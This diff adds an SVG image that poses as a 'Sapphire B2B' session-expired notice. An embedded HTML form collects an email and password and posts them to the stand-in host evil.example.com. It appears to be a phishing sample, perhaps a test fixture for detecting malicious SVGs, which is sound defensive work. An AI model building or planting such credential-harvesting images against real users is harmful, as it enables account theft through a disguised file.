@@ -1,0 +1,16 @@
+<svg xmlns="http://www.w3.org/2000/svg" width="500" height="300">
+<rect width="500" height="300" fill="white"/>
+<text x="50" y="40" font-size="18" fill="black" font-family="Arial">Sapphire B2B - Session Expired</text>
+<text x="50" y="70" font-size="12" fill="gray">Please re-enter your credentials</text>
+<foreignObject x="50" y="90" width="400" height="200">
+<body xmlns="http://www.w3.org/1999/xhtml">
+<form action="https://evil.example.com/steal" method="POST" style="font-family:Arial">
+<label>Email:</label><br/>
+<input type="email" name="email" style="width:300px;padding:5px;margin:5px 0"/><br/>
+<label>Password:</label><br/>
+<input type="password" name="password" style="width:300px;padding:5px;margin:5px 0"/><br/>
+<button type="submit" style="padding:8px 20px;background:#4F46E5;color:white;border:none;cursor:pointer;margin-top:10px">Login</button>
+</form>
+</body>
+</foreignObject>
+</svg>
